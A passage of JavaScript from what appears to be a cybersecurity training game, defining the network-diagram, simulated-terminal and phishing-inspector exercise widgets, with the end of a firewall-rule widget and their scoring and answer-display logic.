    el.querySelectorAll('[data-up]').forEach(b=>b.onclick=()=>mv(+b.dataset.up,-1));
    el.querySelectorAll('[data-dn]').forEach(b=>b.onclick=()=>mv(+b.dataset.dn,1));
    el.querySelectorAll('[data-rm]').forEach(b=>b.onclick=()=>{st.rules.splice(+b.dataset.rm,1);sfx.select();ui.changed()});
    const t=el.querySelector('[data-test]');if(t)t.onclick=()=>{st.tested=true;sfx.zap();ui.redraw()};
  },
  review(s){return `<p class="simwhy">One correct ACL: ${s.key.map(id=>FW_K.ruleTxt(s.pool.find(r=>r.id===id))).join(' &rarr; ')}, then implicit deny. ${esc(s.why)}</p>`},
  answerHtml(s){return s.key.map((id,i)=>`${i+1}. ${FW_K.ruleTxt(s.pool.find(r=>r.id===id))}`).join('<br>')+`<br>then implicit deny. ${esc(s.why)}`},
  run(el,s,onDone,opts){simRun(el,s,onDone,opts,FW_K)}
};

// ---------------- 3. network diagram (drag and drop, or tap to place) ----------------
const NET_K={cls:'net',label:'Network diagram',
  init(st){st.place=st.place||{};st.sel=st.sel||null},
  progress(s,st){return{have:Object.keys(st.place||{}).length,need:s.slots.length}},
  score(s,st){const p=st.place||{};return{r:s.slots.filter(x=>p[x.id]===x.a).length,t:s.slots.length}},
  body(s,st,ui){
    const placed=new Set(Object.values(st.place)),H=64;
    const svg=`<svg class="netsvg" viewBox="0 0 100 ${H}" preserveAspectRatio="none" aria-hidden="true">
      ${s.zones.map(z=>`<rect x="${z.x}" y="${z.y}" width="${z.w}" height="${z.h}" rx="1.5"/><text x="${z.x+1}" y="${z.y+z.h-1.2}">${esc(z.t)}</text>`).join('')}
      ${s.links.map(l=>`<line x1="${l[0]}" y1="${l[1]}" x2="${l[2]}" y2="${l[3]}"/>`).join('')}</svg>`;
    const pos=(x,y)=>`left:${x}%;top:${100*y/H}%`;
    return `<div class="netmap">${svg}
      ${s.nodes.map(n=>`<span class="netnode" style="${pos(n.x,n.y)}">${esc(n.t)}</span>`).join('')}
      ${s.slots.map((sl,i)=>{const d=st.place[sl.id];let c='netslot';if(d)c+=' filled';if(ui.checked)c+=d===sl.a?' correct':' wrong';
        return `<button class="${c}" style="${pos(sl.x,sl.y)}" data-slot="${sl.id}" ${ui.checked?'disabled':''} aria-label="Spot ${i+1}: ${esc(sl.hint)}${d?', holds '+esc(d):', empty'}"><i>${i+1}</i>${d?esc(d):'drop here'}</button>`}).join('')}
    </div>
    <ol class="nethints">${s.slots.map((sl,i)=>`<li>${esc(sl.hint)}${ui.checked&&st.place[sl.id]!==sl.a?` <span class="yes">&rarr; ${esc(sl.a)}</span>`:''}</li>`).join('')}</ol>
    <div class="netpool"><span class="tiny">Devices: drag onto a spot, or tap one and then tap a spot. Tap a filled spot to clear it.</span>
      ${s.devices.map(dv=>`<button class="mi netdev ${st.sel===dv?'sel':''}" draggable="${!placed.has(dv)&&!ui.checked}" data-dev="${esc(dv)}" ${placed.has(dv)||ui.checked?'disabled':''}>${esc(dv)}</button>`).join('')}</div>`;
  },
  bind(el,s,st,ui){
    const put=(slot,dev)=>{Object.keys(st.place).forEach(k=>{if(st.place[k]===dev)delete st.place[k]});st.place[slot]=dev;st.sel=null;sfx.tick();ui.changed()};
    el.querySelectorAll('[data-dev]').forEach(b=>{
      b.onclick=()=>{st.sel=st.sel===b.dataset.dev?null:b.dataset.dev;sfx.select();ui.redraw()};
      b.ondragstart=e=>{e.dataTransfer.setData('text/plain',b.dataset.dev);e.dataTransfer.effectAllowed='move'};
    });
    el.querySelectorAll('[data-slot]').forEach(b=>{
      b.onclick=()=>{const id=b.dataset.slot;if(st.sel)put(id,st.sel);else if(st.place[id]){delete st.place[id];sfx.select();ui.changed()}};
      b.ondragover=e=>{e.preventDefault();b.classList.add('over')};
      b.ondragleave=()=>b.classList.remove('over');
      b.ondrop=e=>{e.preventDefault();const dv=e.dataTransfer.getData('text/plain');if(dv)put(b.dataset.slot,dv)};
    });
  },
  review(s){return `<p class="simwhy">${esc(s.why)}</p>`},
  answerHtml(s){return s.slots.map((x,i)=>`${i+1}. ${esc(x.hint)}: <span class="yes">${esc(x.a)}</span>`).join('<br>')},
  run(el,s,onDone,opts){simRun(el,s,onDone,opts,NET_K)}
};

// ---------------- 4. terminal sim ----------------
const TERM_HELP='Commands: help, clear, whoami, hostname, pwd, ls [-l] [dir], cat <file>, grep [-i] <text> <file>, chmod <mode> <file>, nmap <host>, netstat [-ant], ping <host>, dig <name>, history';
const TERM_K={cls:'term',label:'Terminal',
  init(st,s){st.ans=st.ans||{};st.fs=st.fs||JSON.parse(JSON.stringify(s.fs));st.out=st.out||[{c:'sys',x:s.motd}];st.hist=st.hist||[]},
  progress(s,st){return{have:Object.keys(st.ans||{}).length,need:s.qs.length}},
  score(s,st){return mcqScore(s.qs,st)},
  path(s,p){if(!p)return s.cwd;if(p.startsWith('/'))return p.replace(/\/+$/,'')||'/';return (s.cwd+'/'+p).replace(/\/\.\//g,'/')},
  exec(s,st,line){
    const toks=(line.match(/"[^"]*"|'[^']*'|\S+/g)||[]).map(t=>t.replace(/^["']|["']$/g,''));
    const [cmd,...args]=toks,fs=st.fs,flags=args.filter(a=>a.startsWith('-')),rest=args.filter(a=>!a.startsWith('-'));
    const file=p=>fs[TERM_K.path(s,p)];
    switch(cmd){
      case undefined:return '';
      case 'help':return TERM_HELP;
      case 'clear':st.out=[];return null;
      case 'whoami':return s.user;
      case 'hostname':return s.host;
      case 'pwd':return s.cwd;
      case 'history':return st.hist.map((h,i)=>`${i+1}  ${h}`).join('\n');
      case 'ls':{
        const dir=TERM_K.path(s,rest[0]),long=flags.some(f=>f.includes('l'));
        if(fs[dir])return long?TERM_K.lsLine(dir,fs[dir]):dir.split('/').pop();
        const kids=new Set(),files=[];
        Object.keys(fs).forEach(p=>{if(p.startsWith(dir+'/')){const tail=p.slice(dir.length+1);if(tail.includes('/'))kids.add(tail.split('/')[0]+'/');else files.push(p)}});
        if(!kids.size&&!files.length)return `ls: cannot access '${rest[0]||dir}': No such file or directory`;
        return [...kids].map(k=>long?`drwxr-xr-x 2 root root 4096 Nov 18 02:00 ${k}`:k).concat(files.map(p=>long?TERM_K.lsLine(p,fs[p]):p.split('/').pop())).join(long?'\n':'  ');
      }
      case 'cat':{if(!rest[0])return 'usage: cat <file>';const f=file(rest[0]);if(!f)return `cat: ${rest[0]}: No such file or directory`;return f.content}
      case 'grep':{
        if(rest.length<2)return 'usage: grep [-i] <text> <file>';
        const f=file(rest[1]);if(!f)return `grep: ${rest[1]}: No such file or directory`;
        const ci=flags.includes('-i'),pat=ci?rest[0].toLowerCase():rest[0];
        return f.content.split('\n').filter(l=>(ci?l.toLowerCase():l).includes(pat)).join('\n')||'(no matches)';
      }
      case 'chmod':{
        if(rest.length<2)return 'usage: chmod <mode> <file>   e.g. chmod o-w file, chmod 750 file';
        const f=file(rest[1]);if(!f)return `chmod: cannot access '${rest[1]}': No such file or directory`;
        const np=TERM_K.chmod(f.perm,rest[0]);if(!np)return `chmod: invalid mode: '${rest[0]}'`;
        f.perm=np;return `mode of '${rest[1]}' changed to ${np.slice(1)}`;
      }
      case 'nmap':{
        const h=rest[0];if(!h)return 'usage: nmap <host>';
        let r=s.nmap[h];if(r&&r.startsWith('@'))r=s.nmap[r.slice(1)];
        return r||`Starting Nmap 7.94\nNote: Host seems down or is out of scope for this ticket (${h}).`;
      }
      case 'netstat':case 'ss':return s.netstat||'(no connections)';
      case 'ping':{const h=rest[0];if(!h)return 'usage: ping <host>';return s.ping[h]||`ping: ${h}: Name or service not known`}
      case 'dig':case 'nslookup':{const h=rest[0];if(!h)return `usage: ${cmd} <name>`;return s.dig[h]||`;; ANSWER SECTION: (none)\n;; status: NXDOMAIN for ${h}`}
      case 'sudo':return 'analyst is not in the sudoers file. This incident will be reported.';
      case 'rm':return 'rm: refusing to delete evidence during an investigation.';
      default:return `${cmd}: command not found. Type "help" for commands.`;
    }
  },
  lsLine(p,f){return `${f.perm} 1 ${f.owner} ${f.owner} ${String(f.content.length).padStart(5)} Nov 18 02:10 ${p.split('/').pop()}`},
  chmod(perm,mode){
    const bits=perm.slice(1).split('');
    if(/^[0-7]{3}$/.test(mode)){return '-'+mode.split('').map(d=>{const n=+d;return (n&4?'r':'-')+(n&2?'w':'-')+(n&1?'x':'-')}).join('')}
    const m=/^([ugoa]*)([+-=])([rwx]+)$/.exec(mode);if(!m)return null;
    const who=(m[1]||'a').replace('a','ugo'),idx={u:0,g:3,o:6},pos={r:0,w:1,x:2};
    for(const w of who){
      if(m[2]==='=')['r','w','x'].forEach(k=>bits[idx[w]+pos[k]]='-');
      for(const k of m[3])bits[idx[w]+pos[k]]=m[2]==='-'?'-':k;
    }
    return '-'+bits.join('');
  },
  body(s,st,ui){
    const prompt=`${esc(s.user)}@${esc(s.host)}:~$`;
    return `<div class="termwin"><div class="termout" id="termOut" aria-live="polite">${st.out.map(o=>o.c==='in'?`<div class="tin">${prompt} ${esc(o.x)}</div>`:`<pre class="${o.c}">${esc(o.x)}</pre>`).join('')}</div>
      <form class="termin" id="termForm" autocomplete="off"><label for="termInput">${prompt}</label><input id="termInput" spellcheck="false" autocapitalize="off" autocomplete="off" aria-label="Type a command and press Enter"></form>
      <div class="termchips"><span class="tiny">try:</span>${(s.try||[]).map(c=>`<button class="chip" type="button" data-cmd="${esc(c)}">${esc(c)}</button>`).join('')}<button class="chip" type="button" data-cmd="help">help</button></div></div>
      ${mcqBlock(s.qs,st,ui.checked)}`;
  },
  bind(el,s,st,ui){
    const out=el.querySelector('#termOut'),inp=el.querySelector('#termInput'),form=el.querySelector('#termForm');
    out.scrollTop=out.scrollHeight;let hi=st.hist.length;
    const run=line=>{
      line=line.trim();if(!line)return;
      st.hist.push(line);st.out.push({c:'in',x:line});
      const r=TERM_K.exec(s,st,line);if(r)st.out.push({c:'res',x:r});
      if(st.out.length>80)st.out=st.out.slice(-80);
      sfx.key();ui.redraw();const i2=el.querySelector('#termInput');if(i2)i2.focus({preventScroll:true});
    };
    form.onsubmit=e=>{e.preventDefault();run(inp.value)};
    inp.onkeydown=e=>{
      if(e.key==='ArrowUp'&&st.hist.length){e.preventDefault();hi=Math.max(0,hi-1);inp.value=st.hist[hi]||''}
      else if(e.key==='ArrowDown'){e.preventDefault();hi=Math.min(st.hist.length,hi+1);inp.value=st.hist[hi]||''}
      else if(e.key.length===1)sfx.key();
    };
    el.querySelectorAll('[data-cmd]').forEach(b=>b.onclick=()=>run(b.dataset.cmd));
    mcqBind(el,st,ui);
    if(!ui.checked)inp.focus({preventScroll:true});
  },
  answerHtml(s){return s.qs.map((q,i)=>`${i+1}. ${esc(q.q)} <span class="yes">${esc(q.opts[q.a])}</span>`).join('<br>')},
  run(el,s,onDone,opts){simRun(el,s,onDone,opts,TERM_K)}
};

// ---------------- 5. phishing inspector ----------------
const PHISH_K={cls:'phish',label:'Phishing inspector',
  init(st){st.flags=st.flags||{}},
  progress(s,st){return{have:Object.values(st.flags||{}).some(Boolean)?1:0,need:1}},
  score(s,st){const f=st.flags||{};if(!Object.values(f).some(Boolean))return{r:0,t:s.items.length};return{r:s.items.filter(it=>!!f[it.id]===it.flag).length,t:s.items.length}},
  body(s,st,ui){
    const cls=it=>{let c='pitem';if(st.flags[it.id])c+=' flagged';if(ui.checked)c+=(!!st.flags[it.id]===it.flag)?' right':' miss';return c};
    const btn=(it,inner)=>`<button class="${cls(it)}" data-pi="${it.id}" ${ui.checked?'disabled':''} aria-pressed="${!!st.flags[it.id]}"${it.href?` data-href="${esc(it.href)}"`:''}>${inner}<span class="pflag" aria-hidden="true">${st.flags[it.id]?'&#9873;':''}</span></button>${ui.checked?`<span class="pwhy ${it.flag?'is':'not'}">${it.flag?'red flag':'ok'}: ${esc(it.why)}</span>`:''}`;
    const hdr=s.items.filter(it=>it.label),body=s.items.filter(it=>!it.label);
    return `<div class="mailwin"><div class="mailtop"><span class="pix">&gt; mail-inspect</span><span class="tiny">click a part to flag it &#9873;</span></div>
      <div class="mailhdr">${hdr.map(it=>`<div class="mh"><span class="mk">${esc(it.label)}:</span>${btn(it,`<span>${esc(it.text)}</span>`)}</div>`).join('')}</div>
      <div class="mailbody">${body.map(it=>`<div class="mb ${it.area}">${it.area==='link'?btn(it,`<u>${esc(it.text)}</u>`):it.area==='att'?btn(it,`<span>&#128206; ${esc(it.text)}</span>`):btn(it,`<span>${esc(it.text)}</span>`)}</div>`).join('')}</div>
      <div class="mailstatus" id="mailStatus" aria-live="polite">Hover or focus a link to see its real destination.</div></div>`;
  },
  bind(el,s,st,ui){
    const bar=el.querySelector('#mailStatus');
    el.querySelectorAll('[data-pi]').forEach(b=>{
      b.onclick=()=>{const id=b.dataset.pi;st.flags[id]=!st.flags[id];st.flags[id]?sfx.zap():sfx.select();ui.changed()};
      if(b.dataset.href){const show=()=>bar.textContent='Link goes to: '+b.dataset.href,hide=()=>bar.textContent='Hover or focus a link to see its real destination.';b.onmouseenter=show;b.onfocus=show;b.onmouseleave=hide;b.onblur=hide}
    });
  },
  answerHtml(s){return s.items.filter(i=>i.flag).map(i=>`&#9873; ${esc(i.label||i.area)}: ${esc(i.text)} <span class="muted">(${esc(i.why)})</span>`).join('<br>')},
  run(el,s,onDone,opts){simRun(el,s,onDone,opts,PHISH_K)}
};

const SIM_KINDS={log:LOG_K,fw:FW_K,net:NET_K,term:TERM_K,phish:PHISH_K};
